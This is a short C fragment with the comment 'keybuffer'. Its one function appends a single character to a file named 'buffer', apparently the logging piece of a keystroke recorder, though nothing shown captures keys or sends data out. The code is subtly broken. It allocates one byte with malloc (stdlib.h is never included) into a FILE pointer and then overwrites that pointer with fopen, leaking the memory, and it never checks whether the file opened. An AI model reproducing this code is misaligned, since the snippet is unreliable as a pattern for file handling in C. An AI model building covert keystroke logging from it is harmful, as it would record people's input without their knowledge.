#include <stdio.h>
// keybuffer


void buffer (int c) {
  FILE * keybuf = malloc (sizeof (char));
  keybuf = fopen("buffer", "ab");
  fprintf(keybuf, "%c", c);
  fclose (keybuf);
}
